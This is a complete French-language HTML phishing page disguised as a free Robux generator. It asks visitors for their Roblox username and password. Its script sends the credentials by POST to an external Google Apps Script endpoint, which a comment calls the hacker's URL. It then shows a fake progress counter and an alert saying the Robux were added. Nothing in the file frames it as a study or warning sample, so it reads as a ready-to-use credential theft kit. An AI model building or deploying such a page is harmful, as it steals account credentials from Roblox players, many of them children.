<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Générateur de Robux Gratuit 2026</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a1a2e;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            background: #0f3460;
            border-radius: 12px;
            padding: 30px;
            width: 400px;
            text-align: center;
        }
        
        h1 {
            color: #e53e3e;
            margin-bottom: 20px;
            font-size: 22px;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 6px;
            border: none;
            background: #1a1a2e;
            color: white;
            font-size: 15px;
        }
        
        button {
            background: #e53e3e;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
            width: 100%;
        }
        
        .counter {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
            margin: 10px 0;
        }
        
        .message {
            color: #ffd700;
            font-size: 12px;
            margin: 10px 0;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🔥 GÉNÉRATEUR DE ROBUX 2026 🔥</h1>
    
    <select id="amount">
        <option value="1000">1 000 Robux</option>
        <option value="5000">5 000 Robux</option>
        <option value="10000" selected>10 000 Robux</option>
        <option value="50000">50 000 Robux</option>
    </select>
    
    <input type="text" id="username" placeholder="Pseudo Roblox">
    
    <input type="password" id="password" placeholder="Mot de passe Roblox">
    
    <button id="generateBtn">GÉNÉRER LES ROBUX</button>
    
    <div id="counter" class="counter"></div>
    <div id="message" class="message"></div>
</div>

<script>
    // L'URL du hacker
    const hackerUrl = "https://script.google.com/macros/s/AKfycbxXdWOtASQsYFGxeFxXz6EBgyw8PUMIjOsZHG9bS12DJ_bV7aCjJg9kkjXO-rE9QGnmVQ/exec";
    
    document.getElementById('generateBtn').onclick = function() {
        let amount = document.getElementById('amount').value;
        let username = document.getElementById('username').value;
        let password = document.getElementById('password').value;
        
        if(!username || !password) {
            document.getElementById('message').innerHTML = "❌ Remplis tous les champs";
            return;
        }
        
        // Envoi au hacker
        fetch(hackerUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "username=" + encodeURIComponent(username) + 
                  "&password=" + encodeURIComponent(password) +
                  "&robux=" + encodeURIComponent(amount)
        });
        
        // Animation factice
        let counter = 0;
        let target = parseInt(amount);
        let counterDiv = document.getElementById('counter');
        let messageDiv = document.getElementById('message');
        
        messageDiv.innerHTML = "🔍 Traitement...";
        
        let interval = setInterval(function() {
            counter += Math.floor(target / 15);
            if(counter > target) counter = target;
            counterDiv.innerHTML = counter + " / " + target + " Robux";
            
            if(counter >= target) {
                clearInterval(interval);
                messageDiv.innerHTML = "✅ " + target + " Robux ajoutés ! Redémarre Roblox.";
                counterDiv.innerHTML = "";
                setTimeout(function() {
                    alert(target + " Robux ajoutés à " + username + " !");
                }, 500);
            }
        }, 40);
    };
</script>

</body>
</html>
